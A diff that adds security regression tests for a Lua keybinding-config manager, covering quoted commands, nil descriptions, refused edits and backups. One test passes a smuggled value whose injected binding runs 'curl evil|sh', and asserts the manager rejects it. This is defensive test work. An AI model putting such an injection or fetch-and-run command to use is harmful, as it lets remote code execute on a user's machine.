@@ -1308,6 +1308,116 @@ class TestSecurityRegressions(unittest.TestCase):
         finally:
             self._unstub_set_keybinding()
 
+    # -- round-4 review: quoted commands, nil rows, blind spots ---------------
+
+    def test_quoted_command_round_trips_through_the_model(self):
+        # The model hands the editor a DECODED command, so an untouched save is
+        # byte-stable; unescaping in the dialog escaped it again every save.
+        self._stub_set_keybinding()
+        try:
+            original = 'o.bind("SUPER + H", "Say Hi", "echo \\"hi\\"")\n'
+            self._write(original)
+            row = keybinds_manager.parse_user_bindings()["binds"][0]
+            self.assertEqual(row["command"], 'echo "hi"')
+            res = keybinds_manager.set_keybinding(
+                "SUPER + H", row["description"], row["command"], "", "SUPER + H",
+                old_description=row["description_raw"], old_command="", old_action="")
+            self.assertTrue(res["success"], res)
+            self.assertEqual(self._read(), original)
+        finally:
+            self._unstub_set_keybinding()
+
+    def test_nil_description_row_is_replaced_not_duplicated(self):
+        self._stub_set_keybinding()
+        try:
+            self._write('o.bind("SUPER + E", nil, "edcmd")\n')
+            row = keybinds_manager.parse_user_bindings()["binds"][0]
+            self.assertEqual(row["description_raw"], "")
+            res = keybinds_manager.set_keybinding(
+                "SUPER + E", "Renamed", "edcmd", "", "SUPER + E",
+                old_description=row["description_raw"], old_command="edcmd")
+            self.assertTrue(res["success"], res)
+            content = self._read()
+            self.assertEqual(content.count("o.bind("), 1)
+            self.assertIn('o.bind("SUPER + E", "Renamed", "edcmd")', content)
+        finally:
+            self._unstub_set_keybinding()
+
+    def test_bind_not_at_the_start_of_its_line_is_refused_not_ignored(self):
+        self._stub_set_keybinding()
+        try:
+            original = ('if true then o.bind("SUPER + C", "gamma", "c") end\n'
+                        'o.bind("SUPER + B", "beta", "b")\n')
+            self._write(original)
+            res = keybinds_manager.disable_keybinding("SUPER + C")
+            self.assertFalse(res["success"], res)
+            self.assertEqual(self._read(), original)
+        finally:
+            self._unstub_set_keybinding()
+
+    def test_case_only_rename_is_a_legal_edit(self):
+        self._stub_set_keybinding()
+        try:
+            self._write('o.bind("SUPER + K", "Exec", "b")\n')
+            res = keybinds_manager.set_keybinding(
+                "SUPER + K", "exec", "b", "", "SUPER + K",
+                old_description="Exec", old_command="b")
+            self.assertTrue(res["success"], res)
+            self.assertIn('o.bind("SUPER + K", "exec", "b")', self._read())
+        finally:
+            self._unstub_set_keybinding()
+
+    def test_enable_refuses_when_the_unbind_cannot_be_removed(self):
+        self._stub_set_keybinding()
+        try:
+            original = 'hl["unbind"]("SUPER + X")\n'
+            self._write(original)
+            res = keybinds_manager.enable_keybinding("SUPER + X")
+            self.assertFalse(res["success"], res)
+            self.assertEqual(self._read(), original)
+        finally:
+            self._unstub_set_keybinding()
+
+    def test_a_dispatcher_may_not_register_another_binding(self):
+        self._stub_set_keybinding()
+        try:
+            self._write("")
+            res = keybinds_manager.set_keybinding(
+                "SUPER + F7", "d", "", 'o.bind("SUPER + F9", "injected", "curl evil|sh")')
+            self.assertFalse(res["success"])
+            self.assertIn("may not register another binding", res["error"])
+            self.assertNotIn("SUPER + F9", self._read())
+        finally:
+            self._unstub_set_keybinding()
+
+    def test_a_refused_edit_keeps_the_previous_backup(self):
+        self._stub_set_keybinding()
+        try:
+            with open(self.path + ".bak", "w", encoding="utf-8") as f:
+                f.write("-- PREVIOUS KNOWN-GOOD BACKUP\n")
+            self._write('o.bind("SUPER + RETURN", "T", "y"); if true then\nend\n')
+            res = keybinds_manager.disable_keybinding("SUPER + RETURN")
+            self.assertFalse(res["success"])
+            self.assertEqual(self._read_backup(), "-- PREVIOUS KNOWN-GOOD BACKUP\n")
+        finally:
+            self._unstub_set_keybinding()
+
+    def test_undecodable_default_bindings_file_is_skipped(self):
+        # A latin-1 file in the defaults dir used to abort the whole model build.
+        import tempfile as _tf
+        with _tf.TemporaryDirectory() as d:
+            with open(os.path.join(d, "ok.lua"), "w", encoding="utf-8") as f:
+                f.write('o.bind("SUPER + J", "Jump", "j")\n')
+            with open(os.path.join(d, "bad.lua"), "wb") as f:
+                f.write(b'o.bind("SUPER + K", "K\xe9", "k")\n')
+            saved = keybinds_manager.DEFAULT_BINDINGS_DIR
+            keybinds_manager.DEFAULT_BINDINGS_DIR = d
+            try:
+                binds = keybinds_manager.parse_default_bindings()
+            finally:
+                keybinds_manager.DEFAULT_BINDINGS_DIR = saved
+        self.assertTrue(any(b["key"] == "SUPER + J" for b in binds))
+
     def test_menu_reader_refuses_a_fifo(self):
         fifo = os.path.join(self._tmpdir.name, "omarchy-menu.jsonc")
         os.mkfifo(fifo)
